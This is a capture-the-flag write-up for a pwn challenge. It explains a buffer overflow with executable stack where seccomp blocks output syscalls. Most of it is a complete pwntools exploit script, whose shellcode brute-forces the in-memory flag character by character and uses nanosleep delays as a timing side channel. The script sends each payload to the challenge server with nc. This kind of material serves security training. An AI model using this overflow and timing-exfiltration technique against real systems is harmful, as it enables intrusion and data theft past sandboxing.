### 0x00 Challenge: Weird Chall
**Description:**
>This is a slightly different challenge.
>
>nc 168.119.247.237 5013

### 0x01 Write-up:
It is a typical buffer overflow which is not much realistic since X is disabled... The difference between a simple bof and this challenge is this one has disabled the write syscall (and other), thus, you can run your own code but you can not print anything. If you look the assembly code of the binary, you can see that one of the syscall that are allowed is sys_nanosleep, so, you can imagine how to solve this challenge.

Basically the way to solve this challenge is developing your own shellcode that compares character by character by bruteforce the flag (that is in memory) and making a delay in order to know if the character is the good one.

**Exploit:**
```python
from pwn import *
import time
import os

context(arch = 'amd64', os = 'linux')

context.terminal = ["tmux", "splitw", "-h"]

end_flag = '}'
flag = ""
x = -8
lastchar = 'x'

while end_flag != lastchar:
    for i in string.printable:
        start = time.time()
        shellcode = '''
                xor rdx, rdx
                mov edx, %s
                mov rsi, %s
                mov al, byte ptr [r13 + rsi + 8]
                cmp rax, rdx
                jnz exit
                xor r11, r11
                mov r11d, 0
        delay:
                push 0
                push 5
                mov rsi, rsp
                mov rdi, rsi
                mov esi, 0
                mov al, 35
                syscall
        exit:
                xor rdi, rdi
                mov al, 60
                syscall
        '''%(hex(ord(i)), hex(x))
        f = open("input_pwn", "wb")
        f.write(b"A"*72 + p64(0x00000000004011c2) + asm(shellcode)+b"\x0a")
        f.close()
        log.info("Trying: %s"%i)
        os.system("cat input_pwn | nc 168.119.247.237 5013")
        end = time.time()
        if ((end - start) > 2.0):
            x+=1
            log.success("Found: %s"%i)
            lastchar = i
            flag = flag + i
            break
log.success("Flag: %s"%flag)
```

**Participant write-ups:**

<a href="https://www.youtube.com/watch?v=9vRvnPX3rVo">Video write-up by Razvi</a>
